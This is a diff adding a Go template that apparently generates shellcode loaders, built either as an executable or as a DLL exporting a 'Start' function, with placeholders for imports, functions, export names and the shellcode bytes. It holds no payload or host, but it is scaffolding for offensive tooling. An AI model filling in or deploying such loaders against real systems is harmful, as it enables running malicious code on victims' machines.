@@ -1,0 +1,37 @@
+package main
+
+{{if .IsDLL}}
+import "C"
+{{end}}
+
+import(
+{{range .Imports}} 
+    {{.}}
+{{end}}
+)
+
+{{.DebugInstance}}
+{{.DebugFunction}}
+
+{{range .FunctionsCode}} 
+{{.}}
+{{end}}
+
+{{if .IsDLL}}
+func main(){}
+
+{{.ExportNames}}
+
+//export Start
+func Start(){
+
+{{else}}
+func main(){
+{{end}}
+    shellcode := {{.ShellcodeData}}
+
+{{range .InstancesCode}} 
+    {{.}}
+{{end}}
+
+}
